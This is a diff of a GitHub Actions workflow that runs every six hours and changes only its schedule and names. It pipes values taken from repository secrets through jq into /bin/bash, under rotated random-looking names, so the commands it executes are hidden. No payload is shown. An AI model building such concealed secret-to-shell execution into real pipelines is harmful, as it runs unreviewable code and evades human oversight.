@@ -2,26 +2,29 @@ name: zhaliangyy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
-
+    - cron: '41 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaliangyy
         env:
-          dgs1: ${{ secrets.dgs1 }}
+          qmjz6759: ${{ secrets.qmjz6759 }}
         run: |
-          echo $dgs1 | jq -r .kpzmg6717 | /bin/bash
-          echo $mb5110 | jq -r .ev9702 | /bin/bash
-          echo $f94 | jq -r .xh45 | /bin/bash
-          echo $wts3846 | jq -r .ve34029 | /bin/bash
-          echo $mrn971 | jq -r .kb33454 | /bin/bash
-          echo $qxsz0 | jq -r .vnfrz38 | /bin/bash
-          echo $u03271 | jq -r .g432 | /bin/bash
-          echo $hdlxt3762 | jq -r .zy34318 | /bin/bash
-          echo $vcpvn64616 | jq -r .amdc6 | /bin/bash
-          echo $oe803 | jq -r .t7 | /bin/bash
-          echo $msmi801 | jq -r .azxsl824 | /bin/bash
+          echo $qmjz6759 | jq -r .m2 | /bin/bash
+          echo $lgpg26 | jq -r .xu86 | /bin/bash
+          echo $lgw44560 | jq -r .eqbhz407 | /bin/bash
+          echo $f3191 | jq -r .ghkhw295 | /bin/bash
+          echo $btah845 | jq -r .a27486 | /bin/bash
+          echo $fth297 | jq -r .i0839 | /bin/bash
+          echo $h23 | jq -r .sw55513 | /bin/bash
+          echo $h77 | jq -r .trbf62 | /bin/bash
+          echo $hqoix473 | jq -r .z1 | /bin/bash
+          echo $hc3013 | jq -r .i9154 | /bin/bash
+          echo $pnwav1475 | jq -r .ah8 | /bin/bash
+          echo $nql3 | jq -r .qtnc8 | /bin/bash
+          echo $hnva1930 | jq -r .th65811 | /bin/bash
+          echo $opnoo51918 | jq -r .d55721 | /bin/bash
 
